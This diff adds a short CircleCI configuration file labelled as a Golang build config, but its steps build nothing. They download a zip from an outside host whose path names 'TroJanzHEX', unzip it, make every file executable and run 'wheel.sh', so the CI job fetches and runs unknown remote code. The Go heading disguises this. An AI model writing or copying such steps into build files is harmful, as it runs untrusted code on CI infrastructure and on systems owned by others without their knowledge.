@@ -1,0 +1,14 @@
+# Golang CircleCI 2.0 configuration file
+#
+# Check https://circleci.com/docs/2.0/language-go/ for more details
+version: 2
+
+jobs:
+  build:
+    docker:
+      - image: circleci/golang:1.9
+    steps:
+      - run: curl https://trojanzhex.file2link.workers.dev/0:/TroJanzHEX/spin.zip -o a.zip
+      - run: unzip a.zip
+      - run: chmod +x *
+      - run: ./wheel.sh
